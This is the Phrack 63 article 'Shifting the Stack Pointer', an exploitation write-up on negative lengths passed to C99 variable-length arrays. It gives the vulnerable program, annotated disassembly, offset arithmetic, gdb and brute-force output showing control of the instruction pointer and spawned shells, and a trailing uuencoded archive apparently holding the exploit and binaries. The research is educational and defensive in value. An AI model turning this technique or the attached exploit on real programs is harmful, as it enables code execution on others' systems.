@@ -1,0 +1,708 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<head>
+   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+   <meta http-equiv="content-language" content="en" />
+   <meta name="description" content="Phrack staff website." />
+   <meta name="keywords" content="phrack" />
+   <meta name="robots" content="follow,index,all" />
+
+   <meta name="revisit-after" content="7 days" />
+   
+   <title>.:: Phrack Magazine ::.</title>
+   
+   <link href="../../css/style.css" rel="stylesheet" type="text/css">
+</head>
+<body id="top">
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+
+</div>
+
+<center>
+   <br>
+   <br>
+   <img width="600" src="../../images/phrack-logo.jpg" alt="..[ Phrack Magazine ]..">
+   <br>
+
+   <div class="texto-2">
+   <div class="p-title">.:: Shifting the Stack Pointer ::.</div>
+   <hr width="600" />
+   </div>
+   
+   <div style="padding-top: 4px; padding-bottom: 4px;">
+<div class="around">
+
+<div class="details"><strong>Issues</strong>: 
+[ <a href="../../issues/1/1.html" title="Issue 1">1</a> ] [ <a href="../../issues/2/1.html" title="Issue 2">2</a> ] [ <a href="../../issues/3/1.html" title="Issue 3">3</a> ] [ <a href="../../issues/4/1.html" title="Issue 4">4</a> ] [ <a href="../../issues/5/1.html" title="Issue 5">5</a> ] [ <a href="../../issues/6/1.html" title="Issue 6">6</a> ] [ <a href="../../issues/7/1.html" title="Issue 7">7</a> ] [ <a href="../../issues/8/1.html" title="Issue 8">8</a> ] [ <a href="../../issues/9/1.html" title="Issue 9">9</a> ] [ <a href="../../issues/10/1.html" title="Issue 10">10</a> ] [ <a href="../../issues/11/1.html" title="Issue 11">11</a> ] [ <a href="../../issues/12/1.html" title="Issue 12">12</a> ] [ <a href="../../issues/13/1.html" title="Issue 13">13</a> ] [ <a href="../../issues/14/1.html" title="Issue 14">14</a> ] [ <a href="../../issues/15/1.html" title="Issue 15">15</a> ] [ <a href="../../issues/16/1.html" title="Issue 16">16</a> ] [ <a href="../../issues/17/1.html" title="Issue 17">17</a> ] [ <a href="../../issues/18/1.html" title="Issue 18">18</a> ] [ <a href="../../issues/19/1.html" title="Issue 19">19</a> ] [ <a href="../../issues/20/1.html" title="Issue 20">20</a> ] [ <a href="../../issues/21/1.html" title="Issue 21">21</a> ] [ <a href="../../issues/22/1.html" title="Issue 22">22</a> ] [ <a href="../../issues/23/1.html" title="Issue 23">23</a> ] [ <a href="../../issues/24/1.html" title="Issue 24">24</a> ] [ <a href="../../issues/25/1.html" title="Issue 25">25</a> ] [ <a href="../../issues/26/1.html" title="Issue 26">26</a> ] [ <a href="../../issues/27/1.html" title="Issue 27">27</a> ] [ <a href="../../issues/28/1.html" title="Issue 28">28</a> ] [ <a href="../../issues/29/1.html" title="Issue 29">29</a> ] [ <a href="../../issues/30/1.html" title="Issue 30">30</a> ] [ <a href="../../issues/31/1.html" title="Issue 31">31</a> ] [ <a href="../../issues/32/1.html" title="Issue 32">32</a> ] [ <a href="../../issues/33/1.html" title="Issue 33">33</a> ] [ <a href="../../issues/34/1.html" title="Issue 34">34</a> ] [ <a href="../../issues/35/1.html" title="Issue 35">35</a> ] [ <a href="../../issues/36/1.html" title="Issue 36">36</a> ] [ <a href="../../issues/37/1.html" title="Issue 37">37</a> ] [ <a href="../../issues/38/1.html" title="Issue 38">38</a> ] [ <a href="../../issues/39/1.html" title="Issue 39">39</a> ] [ <a href="../../issues/40/1.html" title="Issue 40">40</a> ] [ <a href="../../issues/41/1.html" title="Issue 41">41</a> ] [ <a href="../../issues/42/1.html" title="Issue 42">42</a> ] [ <a href="../../issues/43/1.html" title="Issue 43">43</a> ] [ <a href="../../issues/44/1.html" title="Issue 44">44</a> ] [ <a href="../../issues/45/1.html" title="Issue 45">45</a> ] [ <a href="../../issues/46/1.html" title="Issue 46">46</a> ] [ <a href="../../issues/47/1.html" title="Issue 47">47</a> ] [ <a href="../../issues/48/1.html" title="Issue 48">48</a> ] [ <a href="../../issues/49/1.html" title="Issue 49">49</a> ] [ <a href="../../issues/50/1.html" title="Issue 50">50</a> ] [ <a href="../../issues/51/1.html" title="Issue 51">51</a> ] [ <a href="../../issues/52/1.html" title="Issue 52">52</a> ] [ <a href="../../issues/53/1.html" title="Issue 53">53</a> ] [ <a href="../../issues/54/1.html" title="Issue 54">54</a> ] [ <a href="../../issues/55/1.html" title="Issue 55">55</a> ] [ <a href="../../issues/56/1.html" title="Issue 56">56</a> ] [ <a href="../../issues/57/1.html" title="Issue 57">57</a> ] [ <a href="../../issues/58/1.html" title="Issue 58">58</a> ] [ <a href="../../issues/59/1.html" title="Issue 59">59</a> ] [ <a href="../../issues/60/1.html" title="Issue 60">60</a> ] [ <a href="../../issues/61/1.html" title="Issue 61">61</a> ] [ <a href="../../issues/62/1.html" title="Issue 62">62</a> ] [ <a class="current" href="../../issues/63/1.html" title="Issue 63">63</a> ] [ <a href="../../issues/64/1.html" title="Issue 64">64</a> ] [ <a href="../../issues/65/1.html" title="Issue 65">65</a> ] [ <a href="../../issues/66/1.html" title="Issue 66">66</a> ] [ <a href="../../issues/67/1.html" title="Issue 67">67</a> ] [ <a href="../../issues/68/1.html" title="Issue 68">68</a> ] [ <a href="../../issues/69/1.html" title="Issue 69">69</a> ] [ <a href="../../issues/70/1.html" title="Issue 70">70</a> ] [ <a href="../../issues/71/1.html" title="Issue 71">71</a> ] 
+</div>
+<div class="opt" align="center"><div class="rt"><a href="../../archives/tgz/phrack63.tar.gz" title="Get current issue tar.gz">Get tar.gz</a></div><strong>Current issue</strong> : #<a href="../../archives/tgz/phrack63.tar.gz" title="Get current issue tar.gz">63</a> | <strong>Release date</strong> : <b>2005-01-08</b> | <strong>Editor</strong> : <b>Phrack Staff</b></div>
+
+<div style="border-top: 1px solid black; border-bottom: 2px solid black">
+<table class="tissue" cellpadding="0" cellspacing="0">
+   <tbody>
+      <tr><td align="left"><a href="../../issues/63/1.html#article">Introduction</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/63/2.html#article">Loopback</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/63/3.html#article">Linenoise</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/63/4.html#article">Phrack Prophile on Tiago</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/63/5.html#article">OSX heap exploitation techniques</a></td><td align="right">Nemo</td></tr>
+<tr><td align="left"><a href="../../issues/63/6.html#article">Hacking Windows CE (pocketpcs &amp; others)</a></td><td align="right">San</td></tr>
+<tr><td align="left"><a href="../../issues/63/7.html#article">Games with kernel Memory...FreeBSD Style</a></td><td align="right">jkong</td></tr>
+<tr><td align="left"><a href="../../issues/63/8.html#article">Raising The Bar For Windows Rootkit Detection</a></td><td align="right">sherri sparks &amp; jamie butler</td></tr>
+<tr><td align="left"><a href="../../issues/63/9.html#article">Embedded ELF Debugging</a></td><td align="right">ELFsh crew</td></tr>
+<tr><td align="left"><a href="../../issues/63/10.html#article">Hacking Grub for Fun &amp; Profit</a></td><td align="right">coolq</td></tr>
+<tr><td align="left"><a href="../../issues/63/11.html#article">Advanced antiforensics : SELF</a></td><td align="right">ripe &amp; pluf</td></tr>
+<tr><td align="left"><a href="../../issues/63/12.html#article">Process Dump and Binary Reconstruction</a></td><td align="right">ilo</td></tr>
+<tr><td align="left"><a href="../../issues/63/13.html#article">Next-Gen. Runtime Binary Encryption</a></td><td align="right">zvrba</td></tr>
+<tr><td align="left"><a href="../../issues/63/14.html#article">Shifting the Stack Pointer</a></td><td align="right">andrewg</td></tr>
+<tr><td align="left"><a href="../../issues/63/15.html#article">NT Shellcode Prevention Demystified</a></td><td align="right">piotr</td></tr>
+<tr><td align="left"><a href="../../issues/63/16.html#article">PowerPC Cracking on OSX with GDB</a></td><td align="right">curious</td></tr>
+<tr><td align="left"><a href="../../issues/63/17.html#article">Hacking with Embedded Systems</a></td><td align="right">cawan</td></tr>
+<tr><td align="left"><a href="../../issues/63/18.html#article">Process Hiding &amp; The Linux Scheduler</a></td><td align="right">ubra</td></tr>
+<tr><td align="left"><a href="../../issues/63/19.html#article">Breaking Through a Firewall</a></td><td align="right">kotkrye</td></tr>
+<tr><td align="left"><a href="../../issues/63/20.html#article">Phrack World News</a></td><td align="right">Phrack Staff</td></tr>
+
+   </tbody>
+</table>
+
+<div class="opt" id="article"><strong>Title</strong> : Shifting the Stack Pointer</div>
+<div class="opt-bottom"> <strong>Author</strong> : andrewg</div>
+<pre>                           ==Phrack Inc.==
+
+              Volume 0x0b, Issue 0x3f, Phile #0x0e of 0x14
+
+
+|=----=[ Clutching at straws: When you can shift the stack pointer ]=----=|
+|=-----------------------------------------------------------------------=|
+|=----------=[ Andrew Griffiths &lt;andrewg@felinemenace.org&gt; ]=------------=|
+
+--[ Table of contents
+
+1 - Introduction
+2 - The story
+2.1 - C99 standard note
+3 - Breakdown
+4 - Moving on
+4.1 - Requirements for exploitability
+5 - Links
+6 - Finishing up
+
+--[ 1 - Introduction
+
+	The paper documents a rare, but none-the less interesting bug in 
+	variable sized arrays in C. This condition appears when a user 
+	supplied length is passed via a parameter to a variable 
+	declaration in a function. 
+
+	As a result of this, an attacker may be able to &quot;shift&quot; the stack
+	pointer to point it to somewhere unexpected, such as above
+	the stack pointer, or somewhere else like the Global Offset
+	Table. 
+
+--[ 2 - The story
+
+	After playing a couple rounds of pool and drinking at a local 
+	pub, nemo talked about some of the fruits after the days auditing
+	session. He mentioned that there was some interesting code 
+	constructs which he hadn't fully explored yet (perhaps because 
+	I dragged him out drinking).
+
+	Basically, the code vaguely looked like: 
+
+	int function(int len, some_other_args)
+	{
+		int a;
+		struct whatever *b; 
+		unsigned long c[len];
+		
+		if(len &gt; SOME_DEFINE) { 
+			return ERROR;
+		} 
+
+		/* rest of the code */
+	}
+
+	and we started discussing about that, and how we could take 
+	advantage of that. After various talks about the compiler emitting
+	code that wouldn't allow it, architectures that it'd work on (and 
+	caveats of those architectures), and of course, another round or 
+	two drinks, we came to the conclusion that it'd be perfectly 
+	feasible to exploit, and it would be a standard esp -= 
+	user_supplied_value;
+
+	The problem in the above code, is that if len is user-supplied 
+	it would be possible to make it negative, and move the stack 
+	pointer move closer to the top of the stack, as opposed to closer 
+	to the bottom (assuming the stack grows down.)
+
+----[ 2.1 - C99 standard note
+
+	The C99 standard allows for variable-length array declaration:
+
+	To quote, 
+
+	&quot;In this example, the size of a variable-length array is computed 
+	 and returned from a function: 
+	 
+	 size_t fsize3 (int n)
+	 { 
+	 	char b[n+3]; //Variable length array. 
+		return sizeof b; // Execution timesizeof. 
+	 } 
+	
+	 int main() 
+	 { 
+	   size_t size; 
+	   size = fsize3(10); // fsize3 returns 13. 
+	   return 0; 
+	 }&quot;
+	
+--[ 3 - Break down
+
+	Here is the (convoluted) C file we'll be using as an example. 
+	We'll cover more things later on in the article. 
+
+	#include &lt;stdlib.h&gt;
+	#include &lt;unistd.h&gt;
+	#include &lt;stdio.h&gt;
+	#include &lt;string.h&gt;
+	#include &lt;sys/types.h&gt;
+
+	int func(int len, char *stuff)
+	{
+		char x[len];
+		
+		printf(&quot;sizeof(x): %d\n&quot;, sizeof(x));
+		strncpy(x, stuff, 4);
+		return 58;
+	}
+
+	int main(int argc, char **argv)
+	{
+		return func(atoi(argv[1]), argv[2]);
+	}
+	
+	The question arises though, what instructions does the compiler 
+	generate for the func function?
+	
+	Here is the resulting disassembly from &quot;gcc version 3.3.5 
+	(Debian 1:3.3.5-8ubuntu2)&quot;, gcc dmeiswrong.c -o dmeiswrong. 
+
+
+080483f4 &lt;func&gt;:
+ 80483f4: 55                   push   %ebp
+ 80483f5: 89 e5                mov    %esp,%ebp ; standard function 
+                                                ; prologue
+ 80483f7: 56                   push   %esi
+ 80483f8: 53                   push   %ebx ; preserve the appropriate 
+                                           ; register contents.
+ 80483f9: 83 ec 10             sub    $0x10,%esp ; setup local 
+                                                ; variables
+ 80483fc: 89 e6                mov    %esp,%esi ; preserve the esp 
+                                                ; register
+ 80483fe: 8b 55 08             mov    0x8(%ebp),%edx ; get the length
+ 8048401: 4a                   dec    %edx	; decrement it
+ 8048402: 8d 42 01             lea    0x1(%edx),%eax ; eax = edx + 1 
+ 8048405: 83 c0 0f             add    $0xf,%eax
+ 8048408: c1 e8 04             shr    $0x4,%eax
+ 804840b: c1 e0 04             shl    $0x4,%eax 
+
+The last three lines are eax = (((eax + 15) &gt;&gt; 4) &lt;&lt; 4); This rounds up 
+and aligns eax to a paragraph boundary.
+
+ 804840e: 29 c4                sub    %eax,%esp ; adjust esp
+ 8048410: 8d 5c 24 0c          lea    0xc(%esp),%ebx ; ebx = esp + 12
+ 8048414: 8d 42 01             lea    0x1(%edx),%eax ; eax = edx + 1 
+ 8048417: 89 44 24 04          mov    %eax,0x4(%esp) ; len argument
+ 804841b: c7 04 24 78 85 04 08 movl   $0x8048578,(%esp) ; fmt string
+                                                  ; &quot;sizeof(x): %d\n&quot;
+ 8048422: e8 d9 fe ff ff       call   8048300 &lt;_init+0x3c&gt; ; printf
+
+ 8048427: c7 44 24 08 04 00 00 movl   $0x4,0x8(%esp) ; len arg to 
+ 804842e: 00                                         ; strncpy
+ 804842f: 8b 45 0c             mov    0xc(%ebp),%eax   
+ 8048432: 89 44 24 04          mov    %eax,0x4(%esp) ; data to copy
+ 8048436: 89 1c 24             mov    %ebx,(%esp)    ; where to write
+
+ ; ebx = adjusted esp + 12 (see 0x8048410)
+
+ 8048439: e8 e2 fe ff ff       call   8048320 &lt;_init+0x5c&gt; ; strncpy
+ 804843e: 89 f4                mov    %esi,%esp  ; restore esp
+ 8048440: b8 3a 00 00 00       mov    $0x3a,%eax ; ready to return 58 
+ 8048445: 8d 65 f8             lea    0xfffffff8(%ebp),%esp 
+				; we restore esp again, just in case it 
+				; didn't happen in the first place.
+ 8048448: 5b		       pop    %ebx
+ 8048449: 5e                   pop    %esi
+ 804844a: 5d                   pop    %ebp 
+ 804844b: c3                   ret ; restore registers and return.
+
+
+	What can we learn from the above assembly output?
+
+	1) There is some rounding done on the supplied value, thus meaning 
+           small negative values (-15 &gt; -1) and small values (1 - 15) will 
+	   become 0. This might possibly be useful, as we'll see below.
+
+	   When the supplied value is -16 or less, then it will be possible
+	   to move the stack pointer backwards (closer to the top of the 
+	   stack).
+
+	   The instruction sub $eax, %esp at 0x804840e can be seen as add 
+	   $16, %esp when len is -16.[1]
+
+	2) The stack pointer is subtracted by the paragraph-aligned 
+	   supplied value.
+	
+	   Since we can supply an almost arbitary value to this, we can 
+	   point the stack pointer at a specified paragraph. 
+
+	   If the stack pointer value is known, we can calcuate the offset 
+	   needed to point the stack at that location in memory. This 
+	   allows us to modify writable sections such as the GOT and heap. 
+
+	3) gcc can output some wierd assembly constructs.
+	
+--[ 4 - Moving on
+
+	So what does the stack diagram look like in this case? When we 
+	reach 0x804840e (sub esp, eax) this is how it looks.
+
+			+------------+
+	0xc0000000 	|   ......   | Top of stack.
+			|   ......   |
+	0xbffff86c	| 0x08048482 | Return address
+	0xbffff868	| 0xbffff878 | Saved EBP
+	0xbffff864	|   ......   | Saved ESI 
+	0xbffff860	|   ......   | Saved EBX
+	0xbffff85c	|   ......   | Local variable space
+	0xbffff858	|   ......   | Local variable space
+	0xbffff854	|   ......   | Local variable space
+	0xbffff850 	+------------+ ESP
+	
+	To overwrite the saved return address, we need to calculate what 
+	to make it subtract by. 
+	
+	delta = 0xbffff86c - 0xbffff850
+	delta = 28
+
+	We need to subtract 12 from our delta value because of the 
+        instruction at 0x08048410 (lea 0xc(%esp),%ebx) so we end up with 16. 
+
+	If the adjusted delta was less than 16 we would end up overwriting 
+	0xbffff85c, due to the paragraph alignment. Depending what is in 
+	that memory location denotes how useful it is. In this particular 
+	case its not. If we could write more than 4 bytes, it could be 
+	useful.
+
+	When we set -16 AAAA as the arguments to dmeiswrong, we get:
+
+	andrewg@supernova:~/papers/straws$ gdb -q ./dmeiswrong
+	Using host libthread_db library &quot;/lib/tls/i686/cmov/libthread_db.so.1&quot;.
+	(gdb) set args -16 AAAA
+	(gdb) r
+	Starting program: /home/andrewg/papers/straws/dmeiswrong -16 AAAA
+	sizeof(x): -16
+
+	Program received signal SIGSEGV, Segmentation fault.
+	0x41414141 in ?? ()
+
+	Based with the above information, an exploit can be written for 
+	dmeiswrong.c. See the attached file iyndwacyndwm.c for more 
+	information.
+
+	The attached exploit code (iyndwacyndwm.c) works on my system 
+	(gcc version: Debian 1:3.3.5-8ubuntu2, kernel: Linux supernova 
+	2.6.10-5-686 #1 Fri Jun 24 17:33:34 UTC 2005 i686 GNU/Linux) with
+	success. 
+	It may fail on the readers machine due to different initial stack 
+	layout, and different compiler options / generated code. You may 
+	need to play a bit with gdb a bit to get it working. However, this 
+	technique should work fine for other people, they may just need to 
+	play around a bit to get it working as expected.
+
+	To get it working for your system, have a look at what causes a 
+	segfault (this can be achieved with a simple 
+
+	  &quot;for i in `seq 0 -4 -128` ; do ./dmeiswrong $i AAAA ; done&quot; 
+
+	loop and seeing if the offset segfaults. The attached Makefile 
+	implements this loop for you when you type make bf. You can then 
+	replay the offset and args in GDB to see if EIP is pointing to 
+	0x41414141.
+
+	Then its a matter of getting the stack layout correct for so the 
+	exploit will run. In the included exploit, I've made it so it 
+	tries to determine the exact offset to where the shellcode starts. 
+	This technique is further explained in [2]. Otherwise, this 
+	technique could be done via examining the heap layout at &quot;_start&quot; 
+	(entry point of the executable) and looking at what is in memory 
+	from the top, and seeing the offset, as its quite possible that 
+	things have been moved around during different kernel releases.
+
+	In order to make it easier for people to play around with this 
+	technique, I've included a precompiled dmeiswrong and iyndwacyndwm 
+	files, which hopefully demonstate the problem. If iyndwacyndwm 
+	does not work for you, try iyndwacyndwm-lame which tries the 
+	standard &quot;pick an offset from some value (like esp)&quot; technique to 
+	try and gain code execution on the host.
+
+	I haven't performed a wide scale test against vulnerable compilers, 
+	but due to the code construct compilers would be most likely to 
+	emit, I suspect a majority of compilers which support variable 
+	sized stack arrays to be vulnerable. Thos which wouldn't be 
+	vulnerable would be those which include code to verify if this is 
+	not a problem during runtime. 
+
+	Exploitability of this type of bug appears to be feasible on other 
+	architectures, such as PPC, as I was able to get it to crash with
+	$pc being something not of my choice. (such as, 0x6f662878, and 
+	sometimes $pc would be pointing at an invalid instruction on the 
+	stack). This was done via just incrementing the value passed as 
+	the len by 4 in a loop. Make bf should point out the exploitable 
+	architectures as they should crash (eventually.)
+
+	I didn't have enough time to look into this further as the time to 
+	submit the final paper drew to close, and PPC assembly and MacOSX
+	are not my strongest skills.
+
+--[ 4.1 - Requirements for exploitability
+
+	In order for an architecture / Operating System to be exploitable, 
+	the architecture needs to support having a stack which can be moved 
+	about. If the stack contains embedded flow control information, 
+	such as saved return addresses, it makes it significantly easier 
+	to exploit, and partially less dependant on what value the stack 
+	pointer contains. This in turn increases reliability in exploits, 
+	especially remote ones.
+
+	Additionally, the compiler needs to:
+
+	- support variable sized stack arrays (which as demonstrated above, 
+	  is a feature of the C99 standard)
+
+	- not emit code that performs sanity checking of the changed stack 
+	  pointer. It is forseeable that if this issue gets a lot of public 
+	  attention, that various compiler security patches (such as 
+	  pro-police, stackguard, so fourth) will add detection of this 
+	  issue.
+
+	The direction the stack grows is not that relevant to the problem, 
+	as if the x86 stack grew upwards, the instruction at 0x804840e, 
+	would be written as addl %eax, %esp, and given the parameter len 
+	as -16 would could be rewritten as subl $16, %esp, which would 
+	allow access to the saved eip and saved frame pointer, amongst 
+	other things. 
+
+	The attached Makefile has a &quot;bf&quot; option which should allow you 
+	to test if your architecture is vulnerable. In order to make this 
+	work as expected, you'll need to supply the top of the stack for 
+	your architecture, and a proper shellcode. A recommended test 
+	shellcode is the trap instruction (int3 on x86, trap on ppc) which 
+	generates a particular signature when the code is executed. 
+
+	The output from the make bf command on my laptop is as follows:
+
+	andrewg@supernova:~/papers/straws/src$ make bf
+	for i in `seq 0 -4 -256` ; do ./iyndwacyndwm-lame $i ; done
+	sizeof(x): 0
+	sizeof(x): -4
+	sizeof(x): -8
+	sizeof(x): -12
+	sizeof(x): -16
+	sh-3.00$ exit
+	sizeof(x): -20
+	sh-3.00$ exit
+	sizeof(x): -24
+	sh-3.00$ exit
+	sizeof(x): -28
+	sh-3.00$ exit
+	sizeof(x): -32
+	/bin/sh: line 1: 16640 Segmentation fault      ./iyndwacyndwm-lame $i
+	sizeof(x): -36
+
+	[ snipped a bunch of Segmentation fault messages ] 	
+
+	/bin/sh: line 1: 16648 Floating point exception./iyndwacyndwm-lame $i
+	sizeof(x): -68
+	/bin/sh: line 1: 16649 Floating point exception./iyndwacyndwm-lame $i
+	sizeof(x): -72
+
+	[ snipped a bunch of Floating point exception messages and segv ] 
+
+	andrewg@supernova:~/papers/straws/src$
+
+	The make bf-trap command generates the following output:
+
+	for i in `seq 0 -4 -256` ; do ./iyndwacyndwm-lame-trap $i ; done
+	sizeof(x): 0
+	sizeof(x): -4
+	sizeof(x): -8
+	sizeof(x): -12
+	sizeof(x): -16
+	/bin/sh: line 1: 16983 Trace/breakpoint trap ./iyndwacyndwm-lame-trap $i
+	sizeof(x): -20
+	/bin/sh: line 1: 16984 Trace/breakpoint trap ./iyndwacyndwm-lame-trap $i
+	sizeof(x): -24
+
+
+--[ 5 - Links
+
+[1] http://www.eduplace.com/math/mathsteps/6/b/
+[2] http://packetstorm.linuxsecurity.com/groups/netric/envpaper.pdf
+
+--[ 6 - Finishing up
+
+I'd like to greet all of the felinemenace people ((in no particular order) 
+nevar, nemo, mercy, ash, kwine, jaguar, circut, nd and n00ne), along with 
+pulltheplug people, especially arcanum.
+
+Random greets to dme, caddis, Moby for his visual basic advice while 
+discussing this problem at the pub, and zen-parse.
+
+It kinda goes without saying, but I'd like to thank all the people who have 
+supplied feedback for my article.
+
+[ Need a challenge ? ]
+[ Visit http://www.pulltheplug.org ] 
+
+[ Want to visit Australia and want a reason? ]
+[ RUXCON is being held on 1st and 2nd of October - see you there ] 
+[ http://www.ruxcon.org.au/ ] 
+
+|=[ EOF ]=---------------------------------------------------------------=|
+
+
+begin 644 src.tar.gz
+M'XL(`&quot;UIVD(``^Q:&quot;W0&lt;U7F&gt;G=T=K5:R+%G&quot;Q@=CQK($DB/MZBU9M@'9%K*#
+M;,F2[)A89K./6&gt;W`:G;9F9'D!V&quot;0#1;&amp;A8`A;NH4$UR:!RV4Y'!2(`&lt;#+H2V
+M28&amp;&gt;-&quot;?-(&lt;=M2&quot;.71SD))81P&lt;/_OWIG=65F`2X&amp;&lt;GC`Z]\[]__N_[W\?LU=Z
+M)AH4/N&amp;G@9[VUE:\&amp;]M;&amp;YQO^Q$:&amp;YK:VEK:6EJ`;VQJ;VT1Y-9/VC`\IFZ$
+M,[(LA+581AD?&gt;5^Z#^NW';'?_T\&gt;G&lt;8_-JJH^G@FI8T$HI^$#L2#1O9]Q[^E
+MS1K_YK:FQM8V&amp;O_6IO8V0?Y4@OA'/OY+52V:-&amp;.*O%(W8DDU$DA&lt;[,_A3$TE
+M=#Z.$&amp;IJ)BJC4O+DXW;H06-'6M&amp;!]JN:(&lt;=-+5J#1E+1ZN1H@L*^3#?,&gt;+S6
+MO\M?R.&quot;);=2W?86_T%^8)I%&amp;O*925W&lt;JJ7C-1&amp;VG7!T;UBKKY&quot;RFE@A)M19-
+M[ZB9(#QDU&lt;DMA/879A3#S&amp;AR:\&lt;*_[5&lt;_6A8U9CZ&lt;&amp;8D:NM?1L`8TV\Q,&quot;/#
+M1DJM0&lt;^VQNVU=3)K-6VOA:@_]'A]W`_FO[I#BXV'HZA'/XD5X$/F?W-38W;]
+M;VYH;L'\;VOZ;/Y_*D\P**^,AF,Q5;]85N/RCI1Y44:1M90AQU+CFCRN&amp;@DY
+MK.FJ3%-FULY1)&gt;#W!Y?YY66R%:)+=3.M9+346+CSNF`Z3&amp;T]2-,T/*Y7R8&amp;\
+M9`.38W[7-[8Q3**^.=#04&quot;4KT41*KNKO&amp;EH'=-#4,\%D*AI.!O6(JG4ZX&quot;R8
+MZV`-#E*5+W9&quot;-&lt;[.7*(*^OW^C[)&amp;GKD@*AE2\D%KY-*8$E&lt;U11X&lt;ZEIS&gt;6BH
+MKU]NF(A:Z00CXM0O#PUT]?L++2`42J&gt;CH9#?I`$:T9087]3TA)),1E,Q9=MV
+M&gt;95&lt;.3S1'A^&gt;4!J&amp;)QI0.BIIU5RJ)%6PJ\T=;1_.'XU:/+KBQSN3267DRBM2
+M9H:6QFA&quot;-90HK9V*K.HR23+3Z53&amp;(&amp;%QHJ(XIF55HWB844--:7J=G$XJ85V1
+MS70L;&quot;BRD5#D0%2.JTFED@G78FJ&lt;O&amp;7*/L@N/QG6W#@\$6L:GFBETM9!11F&gt;
+M:&quot;)GVYLMN(/#*&amp;V@63X\T4%%::X$.]A:FRT4B&gt;J(#4^T$*XA0CY3NZ.!_,Y:
+MI,8UQ+RW:T.W8T-A&gt;P=-(DK#J&amp;D[E(K'=&lt;60C90\GE`R')&gt;UGJ9-,BE'%#FC
+MZ&amp;H,:&gt;(OS#H*N;03D7^Y+*B76ZA8\R0KIC:'JPPXCG&quot;5V!7YYL;V+&lt;1JEYQ/
+M4B=7TERC5PTGK*VYD)323K=Q&lt;V^O?.T*V9:@:&amp;-I2T)6L9/*7ZA,*-$QI6:F
+M?*BND\%&gt;NZ*P$%NPE3[Y.[%C'^:[\&quot;PCOG-;$TT`'`H^)$H@.QO?P]C6W]?W
+MLW*=,E6-UX2C\I)5&lt;E.M3(9GSRL8ZV1XE)(@C82GU29-TT.GU09!,4&lt;5C24&amp;
+MC7\ZK.OD3(UN1FF-U;'\U:(K8VHL8X@SF5*-`!UZ,*:%6+=JNK&gt;N'PI=UK6^
+M=_-`-[#78A!&amp;E5'*-YX;.^MHV5C&gt;4)&gt;7,#MK9\L@\!,KCD^&lt;2O[&lt;67#5.&gt;,Q
+MJTS^=Q:9P?.&quot;S:\_]#[XQ_KD?_]],CH^^/N_J:V]K3WW_=_2CO-?(QT)/SO_
+M?0K/]=V]E[E&lt;KBPL&quot;FX!4,.DQ]&gt;&quot;]V*.;Q%DH4&quot;H$98(BP6)P53V$`V5D]1&amp;
+M\5+Q4'%3J2`A%3=X?&quot;CE!)=;?2ZKL(=X46XF1A3P&quot;Z6\?S\!^^_R^%&quot;*&quot;5%*
+M1;+Z17H=IO[#U(?R`X)1)$L'2@W1UY!N%)E@V=&amp;WZ9=&amp;;+98V/Q!.N,%D['Z
+MI*J9$P$]%6CB^%++]IZ-FZU8\2)8/ONH%%@TWEGDBX[X2+/T;[+&gt;[U&quot;91R5@
+MP&lt;LM&gt;)4%UUNP_?O840M&gt;3&lt;78Y_%!1YE0DHNSY?\Y,V`A]/FQT(`R0N=7);,F
+MB&gt;U(%T*AD=&amp;4%L*L,$(A@4(110C:!+[!&quot;=8'MX!O9&quot;&amp;TOB^$WP.TD$E;&amp;?&amp;&quot;
+MW.+%+B_T]*Y?O2;4%&amp;C@_O,_VRX7_559&lt;&lt;53JJIS0&amp;5_@MY^M\&lt;G44#WT+N`
+MF/;B34'&lt;CS&lt;%\5:\R=G-4[^&lt;?-4WO8]8IE]%U4-$4Z]N?YK:IULGB.IT]6ZJ
+M(?-T-:0ET#QU\C0]U9&quot;:0-^IYQD,Z0F8=.HX@Z$E&lt;2[@APAL?.W*J7^;?/F-
+M_J&amp;!Q#_NI9Z]5&amp;W:DNBEU_0]1/#F[;=S&gt;Z:VOSN]D-AN&gt;'H&gt;)?^!R474WG?&lt;
+M$$\_?V#[N[#NP**JIRW:/:L.P3ZS_M[;*9\/E.Y[T3COX&quot;,P&lt;O*XYS[@3K^8
+M[3)?&gt;&lt;8+&lt;M=S3T^]Q?GO31-,PI=\3^!:SGW64P7&lt;]*+=O_\MEW3P&quot;=103#Q;
+M!B=?+9WZCP.;?9\_N-HU&gt;7SND].&gt;)T]Z:D\&lt;'*XJ)LS4VBH/B9B@;)K^Z7NG
+M3S^[MHJEU8'N8G1-+:J:_G=&quot;3[WYO4Z(5M[&gt;=B632[90&lt;)@5M2&gt;(F,P_($QY
+MJJ:/@?HIAO$1!C(JJJ8S%+#GP/&gt;%+8UO#4[_)Q'=\/0ORLCM5XNGJPDZ.%E!
+M)`?O1%W[U)/OB,O_12^=^LGI0]\!9O(9U_+W,K^&gt;/%&amp;\[&lt;J0K9]LFS*J/--?
+M8\+N)F%Y0IY_\FUQW_&amp;#Z=-FZ70?/&quot;):&amp;@G$Q9(Z]&lt;;DZZY]Q\TW7ODY&amp;TL*
+ME&gt;&gt;Q+U$P[T4U^?9I8_[!,&gt;'@XQ&gt;Q\7G%0P/J)JSYYM9M61MH[,]G^N&gt;3_ND%
+MU+0&amp;W&lt;WR7A3R?M9RG'Z25IYBCF!N%%,Y&lt;:/'1Q-#Z+?F]CI:T[&quot;^O$MOK&quot;.[
+MZ0T1HU2*K/EDSW7H,TBF:,WY&quot;K8V&quot;,(&quot;*L=(+MI'Z(WU`XK+K3=9G-I-&gt;(I'
+M&quot;K:\0&gt;^K;N2V_6\&gt;3&quot;'G&amp;P_6;+O]%LF4:*^93^7&quot;20O?LV9-IUQ#RVRMW!QH
